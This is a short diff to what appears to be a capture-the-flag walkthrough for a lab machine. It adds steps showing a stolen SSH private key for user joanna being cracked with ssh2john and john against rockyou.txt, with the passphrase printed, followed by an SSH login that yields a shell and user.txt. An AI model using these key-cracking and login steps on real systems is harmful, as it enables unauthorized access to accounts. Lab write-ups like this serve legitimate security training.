@@ -105,9 +105,15 @@ curl  -s http://127.0.0.1:52846/main.php -b cookie
 ```
 We get the ssh private key for user joanna.
 Cracking the key with john shows the passphrase **bloodninjas**
+
 ```bash
 $ ssh2john.py priv_key > hash
 $ john --wordlist=rockyou.txt hash
+```
+Logged in thorugh ssh.
+
+```bash
+ssh -i priv_key joanna@10.10.10.171
 ```
 Got the joanna's shell as well as user.txt.
 
